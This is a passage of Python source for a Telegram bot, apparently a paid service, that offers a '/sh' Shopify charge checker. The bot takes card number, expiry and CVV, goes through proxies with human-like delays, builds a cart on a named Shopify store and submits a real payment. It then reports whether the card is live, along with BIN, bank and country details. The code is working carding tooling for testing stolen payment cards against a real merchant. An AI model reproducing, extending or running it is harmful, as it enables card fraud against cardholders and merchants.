                    return False, "INSUFFICIENT_FUNDS"
                elif "INCORRECT_CVC" in str(data).upper() or "INVALID_CVC" in str(data).upper():
                    return False, "INCORRECT_CVC"
                elif "FRAUD" in str(data).upper():
                    return False, "FRAUD_DETECTED"
                elif "3DS" in str(data).upper() or "AUTHENTICATION" in str(data).upper():
                    return False, "3D_SECURE_REQUIRED"
                else:
                    return False, "DECLINED - Unknown reason"
                    
            else:
                return False, f"SERVER_ERROR: Status {response.status_code}"
                
        except Exception as e:
            logger.error(f"Submit payment error: {str(e)}")
            return False, f"ERROR: {str(e)[:100]}"
            
    def generate_session_token(self):
        """Generate session token"""
        chars = string.ascii_letters + string.digits + "-_"
        token_parts = []
        
        for i in range(5):
            part_length = random.randint(20, 40)
            part = ''.join(random.choice(chars) for _ in range(part_length))
            token_parts.append(part)
        
        return '-'.join(token_parts)
        
    def clean_error_message(self, message):
        """Clean and format error message"""
        if not message:
            return "Unknown error"
        
        # Remove HTML tags
        message = re.sub(r'<[^>]+>', '', message).strip()
        
        # Remove common prefixes
        prefixes = [
            "error: ", "sorry, ", "payment failed: ", "transaction failed: ",
            "there was an error: ", "we're sorry, ", "unable to process: "
        ]
        
        for prefix in prefixes:
            if message.lower().startswith(prefix.lower()):
                message = message[len(prefix):].strip()
                break
        
        # Capitalize first letter
        if message:
            message = message[0].upper() + message[1:]
        
        return message
        
    async def format_response(self, cc, mes, ano, cvv, status, message, username, elapsed_time, user_data, bin_info=None):
        """Format response message"""
        if bin_info is None:
            bin_info = await self.get_bin_info(cc)

        user_id = user_data.get("user_id", "Unknown")
        first_name = html.escape(user_data.get("first_name", "User"))
        badge = user_data.get("plan", {}).get("badge", "🔰")

        # Clean error message
        if ":" in message:
            error_parts = message.split(":", 1)
            if len(error_parts) > 1:
                error_type = error_parts[0].strip()
                error_msg = error_parts[1].strip()
                message_display = f"{error_type}: {error_msg}"
            else:
                message_display = message
        else:
            message_display = message

        if status == "APPROVED":
            status_emoji = "✅"
            status_text = "APPROVED"
        elif "CARD_DECLINED" in message or "DECLINED" in message.upper():
            status_emoji = "❌"
            status_text = "DECLINED"
        elif "3D_SECURE" in message or "AUTHENTICATION" in message.upper():
            status_emoji = "🛡️"
            status_text = "3D SECURE"
        elif "CAPTCHA" in message:
            status_emoji = "🤖"
            status_text = "CAPTCHA"
        elif "FRAUD" in message:
            status_emoji = "🚫"
            status_text = "FRAUD"
        elif "INSUFFICIENT" in message:
            status_emoji = "💰"
            status_text = "INSUFFICIENT FUNDS"
        else:
            status_emoji = "❌"
            status_text = "DECLINED"

        clean_name = re.sub(r'[↑←«~∞🏴]', '', first_name).strip()
        user_display = f"『{badge}』{clean_name}"
        bank_info = bin_info['bank'].upper() if bin_info['bank'] != 'N/A' else 'N/A'

        response = f"""<b>『$cmd → /sh』| <b>WAYNE</b> </b>
┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃
<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway -</b> Shopify Charge
<b>[•] Status-</b> <code>{status_text} {status_emoji}</code>
<b>[•] Response-</b> <code>{message_display}</code>
┃ ┃ ┃ ┃ ┃ ┃ ┃ ┃ ┃ ┃ ┃ ┃ ┃
<b>[+] Bin:</b> <code>{cc[:6]}</code>  
<b>[+] Info:</b> <code>{bin_info['scheme']} - {bin_info['type']} - {bin_info['brand']}</code>
<b>[+] Bank:</b> <code>{bank_info}</code> 🏦
<b>[+] Country:</b> <code>{bin_info['country']}</code> [{bin_info['emoji']}]
┃ ┃ ┃ ┃ ┃ ┃ ┃ ┃ ┃ ┃ ┃ ┃ ┃
<b>[🛡️] Checked By:</b> {user_display}
<b>[💎] Dev ➤</b> <b><i>DADYY</i></b>
┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃
<b>[🛡️] T/t:</b> <code>{elapsed_time:.2f} ⚡</code> |<b>P/x:</b> <code>Live ♥️</code></b>"""

        return response
        
    async def check_card(self, card_details, username, user_data):
        """Main card checking method"""
        start_time = time.time()
        logger.info(f"🔄 Starting Shopify Charge check: {card_details}")
        
        try:
            # Parse card details
            cc_parts = card_details.split('|')
            if len(cc_parts) < 4:
                return await self.format_response("", "", "", "", "ERROR", "Invalid card format. Use: CC|MM|YY|CVV", username, time.time()-start_time, user_data)

            cc = cc_parts[0].strip().replace(" ", "")
            mes = cc_parts[1].strip()
            ano = cc_parts[2].strip()
            cvv = cc_parts[3].strip()

            # Validate card details
            if not cc.isdigit() or len(cc) < 15:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid card number", username, time.time()-start_time, user_data)

            if not mes.isdigit() or len(mes) not in [1, 2] or not (1 <= int(mes) <= 12):
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid month", username, time.time()-start_time, user_data)

            if not ano.isdigit() or len(ano) not in [2, 4]:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid year", username, time.time()-start_time, user_data)

            if not cvv.isdigit() or len(cvv) not in [3, 4]:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid CVV", username, time.time()-start_time, user_data)

            if len(ano) == 2:
                ano = '20' + ano

            # Get BIN info
            bin_info = await self.get_bin_info(cc)
            logger.bin_info(f"BIN: {cc[:6]} | {bin_info['scheme']} - {bin_info['type']} | {bin_info['bank']} | {bin_info['country']} [{bin_info['emoji']}]")

            # Create HTTP client with proxy if available
            client_params = {
                'timeout': 30.0,
                'follow_redirects': True,
                'limits': httpx.Limits(max_keepalive_connections=5, max_connections=10),
                'http2': True
            }
            
            # Add proxy if available
            if self.current_proxy:
                client_params['proxy'] = self.current_proxy
                logger.proxy(f"Using proxy: {self.current_proxy[:50]}...")

            async with httpx.AsyncClient(**client_params) as client:
                # Step 1: Get access token
                await self.get_access_token(client)
                await self.human_delay(1, 2)
                
                # Step 2: Get product info
                success, price = await self.get_product_info(client)
                if not success:
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Failed to get product info", username, time.time()-start_time, user_data, bin_info)
                await self.human_delay(1, 2)
                
                # Step 3: Create cart
                success, checkout_url = await self.create_cart(client, self.variant_id, price)
                if not success:
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Failed to create cart", username, time.time()-start_time, user_data, bin_info)
                await self.human_delay(1, 2)
                
                # Step 4: Load checkout page
                success = await self.load_checkout_page(client, checkout_url)
                if not success:
                    logger.warning("Checkout page load had issues but continuing...")
                await self.human_delay(1, 2)
                
                # Step 5: Create payment session
                success, session_id = await self.create_payment_session(client, cc, mes, ano, cvv)
                if not success:
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Failed to create payment session", username, time.time()-start_time, user_data, bin_info)
                await self.human_delay(1, 2)
                
                # Step 6: Submit payment
                success, payment_result = await self.submit_payment(client, cc, mes, ano, cvv, session_id, price)
                
                elapsed_time = time.time() - start_time
                
                if success:
                    logger.success(f"Payment successful in {elapsed_time:.2f}s")
                    return await self.format_response(cc, mes, ano, cvv, "APPROVED", payment_result, username, elapsed_time, user_data, bin_info)
                else:
                    logger.error(f"Payment failed: {payment_result}")
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", payment_result, username, elapsed_time, user_data, bin_info)

        except httpx.TimeoutException:
            logger.error("Request timeout")
            elapsed_time = time.time() - start_time
            return await self.format_response(cc, mes, ano, cvv, "ERROR", "TIMEOUT_ERROR: Request timeout", username, elapsed_time, user_data, bin_info)
        except httpx.ConnectError:
            logger.error("Connection error")
            elapsed_time = time.time() - start_time
            return await self.format_response(cc, mes, ano, cvv, "ERROR", "CONNECTION_ERROR: Connection failed", username, elapsed_time, user_data, bin_info)
        except Exception as e:
            logger.error(f"Unexpected error: {str(e)}")
            elapsed_time = time.time() - start_time
            return await self.format_response(cc, mes, ano, cvv, "ERROR", f"UNKNOWN_ERROR: {str(e)[:80]}", username, elapsed_time, user_data, bin_info)

# Command handler
@Client.on_message(filters.command(["sh", ".sh", "$sh"]))
@auth_and_free_restricted
async def handle_shopify_charge(client: Client, message: Message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or str(user_id)

        # CHECK: First check if command is disabled
        command_text = message.text.split()[0]
        command_name = command_text.lstrip('/.$')

        if is_command_disabled(command_name):
            await message.reply(get_command_offline_message(command_text))
            return

        # Check if user is banned
        if is_user_banned(user_id):
            await message.reply("""<pre>⚠️ User Banned</pre>
┃┃┃┃┃┃┃┃┃┃┃┃┃
🠪 <b>Message</b>: You have been banned from using this bot.
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
┃┃┃┃┃┃┃┃┃┃┃┃┃""")
            return

        # Load user data
        users = load_users()
        user_id_str = str(user_id)
        if user_id_str not in users:
            await message.reply("""<pre>📝 Registration Required</pre>
┃┃┃┃┃┃┃┃┃┃┃┃┃
🠪 <b>Message</b>: You need to register first with /register
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
┃┃┃┃┃┃┃┃┃┃┃┃┃""")
            return

        user_data = users[user_id_str]
        user_plan = user_data.get("plan", {})
        plan_name = user_plan.get("plan", "Free")

        # Check cooldown (owner is automatically skipped in check_cooldown function)
        can_use, wait_time = check_cooldown(user_id, "sh")
        if not can_use:
            await message.reply(f"""<pre>⏱️ Cooldown Active</pre>
┃┃┃┃┃┃┃┃┃┃┃┃┃
🠪 <b>Message</b>: Please wait {wait_time:.1f} seconds before using this command again.
🠪 <b>Your Plan:</b> <code>{plan_name}</code>
🠪 <b>Anti-Spam:</b> <code>{user_plan.get('antispam', 15)}s</code>
┃┃┃┃┃┃┃┃┃┃┃┃┃""")
            return

        args = message.text.split()
        if len(args) < 2:
            if charge_processor:
                await message.reply(charge_processor.get_usage_message(
                    "sh", 
                    "Shopify Charge",
                    "4111111111111111|12|2025|123"
                ))
            else:
                await message.reply("""<pre>#WAYNE ━[SHOPIFY CHARGE]━━</pre>
┃┃┃┃┃┃┃┃┃┃┃┃┃
🠪 <b>Command</b>: <code>/sh</code> or <code>.sh</code> or <code>$sh</code>
🠪 <b>Usage</b>: <code>/sh cc|mm|yy|cvv</code>
🠪 <b>Example</b>: <code>/sh 4111111111111111|12|2025|123</code>
┃┃┃┃┃┃┃┃┃┃┃┃┃
<b>~ Note:</b> <code>Charges via Shopify gateway (Deducts 2 credits AFTER check completes)</code>
<b>~ Note:</b> <code>Free users can use in authorized groups with credit deduction</code>
<b>~ Store:</b> <code>meta-app-prod-store-1.myshopify.com</code>
<b>~ Product:</b> <code>retailer-id-fix-no-mapping</code>
<b>~ Address:</b> <code>8 Log Pond Drive, Horsham PA 19044</code>
<b>~ Shipping:</b> <code>Local Pickup</code>
<b>~ Tip:</b> <code>None</code>""")
            return

        card_details = args[1].strip()

        cc_parts = card_details.split('|')
        if len(cc_parts) < 4:
            await message.reply("""<pre>❌ Invalid Format</pre>
┃┃┃┃┃┃┃┃┃┃┃┃┃
🠪 <b>Message</b>: Invalid card format.
🠪 <b>Correct Format</b>: <code>cc|mm|yy|cvv</code>
🠪 <b>Example</b>: <code>4111111111111111|12|2025|123</code>
┃┃┃┃┃┃┃┃┃┃┃┃┃""")
            return

        cc = cc_parts[0]
        mes = cc_parts[1]
        ano = cc_parts[2]
        cvv = cc_parts[3]

        # Show processing message
        processing_msg = await message.reply(
            charge_processor.get_processing_message(
                cc, mes, ano, cvv, username, plan_name, 
                "Shopify Charge", "sh"
            ) if charge_processor else f"""<b>『$cmd → /sh』| <b>WAYNE</b> </b>
┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃
<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway -</b> Shopify Charge
<b>[•] Status-</b> Processing... ⏱️
┃ ┃ ┃ ┃ ┃ ┃ ┃ ┃ ┃ ┃ ┃ ┃ ┃
<b>[+] Plan:</b> {plan_name}
<b>[+] User:</b> @{username}
<b>[+] Store:</b> meta-app-prod-store-1.myshopify.com
┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃
<b>Checking card... Please wait.</b>"""
        )

        # Create checker instance
        checker = ShopifyChargeChecker(user_id)

        # Process command through universal charge processor
        if charge_processor:
            success, result, credits_deducted = await charge_processor.execute_charge_command(
                user_id,                    # positional
                checker.check_card,         # positional
                card_details,               # check_args[0]
                username,                   # check_args[1]
                user_data,                  # check_args[2]
                credits_needed=2,           # keyword
                command_name="sh",          # keyword
                gateway_name="Shopify Charge"  # keyword
            )

            await processing_msg.edit_text(result, disable_web_page_preview=True)
        else:
            # Fallback to old method if charge_processor not available
            result = await checker.check_card(card_details, username, user_data)
            await processing_msg.edit_text(result, disable_web_page_preview=True)

    except Exception as e:
        error_msg = str(e)[:150]
        await message.reply(f"""<pre>❌ Command Error</pre>
┃┃┃┃┃┃┃┃┃┃┃┃┃
🠪 <b>Message</b>: An error occurred while processing your request.
🠪 <b>Error</b>: <code>{error_msg}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
┃┃┃┃┃┃┃┃┃┃┃┃┃""")
